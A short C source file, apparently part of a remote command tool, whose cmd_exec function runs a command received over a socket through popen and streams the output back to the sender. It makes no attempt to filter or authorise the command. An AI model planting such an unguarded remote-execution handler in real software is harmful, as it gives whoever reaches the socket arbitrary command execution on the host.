#include "../master.h"
#include "cmd_exec.h"

STAT cmd_exec() 
{
	if (unlikely(0 == strlen(GetSDrdata(Gsd)))) {
		printf("can't get cmd\n");
		goto err;
	}
	/* execute command */
	g_dfp = popen(GetSDrdata(Gsd), "r");

	/* read data and send it in loop until file end */
	while(NULL != fgets(GetSDsdata(Gsd), DATA_LEN, g_dfp)) {
		printf("[-]\t%s", GetSDsdata(Gsd));
		send(GetSDfd(Gsd), GetSDsdata(Gsd), DATA_LEN, 0);
	}
	SendOverTag();
	pclose(g_dfp);
	
	return SUCCESS;
err:
	return FAILURE;
}
